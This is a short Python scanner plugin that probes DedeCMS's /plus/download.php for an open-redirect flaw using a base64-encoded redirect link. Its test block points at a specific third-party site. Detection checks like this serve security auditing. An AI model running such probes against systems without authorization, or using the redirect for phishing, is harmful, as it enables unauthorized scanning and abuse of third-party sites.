#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'Dedecms /plus/download.php URL Redirect',
	'AUTHOR':'Ario,yangbh',
	'TIME':'20140811',
	'WEB':'',
	'DESCRIPTION':''
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'DedeCms':
			return True
	return False

def Audit(services):
	url = services['url'] + "/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D"
	try:
		rqu = requests.get(url)
		if rqu.url == 'http://www.baidu.com':
			security_note(url)

	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)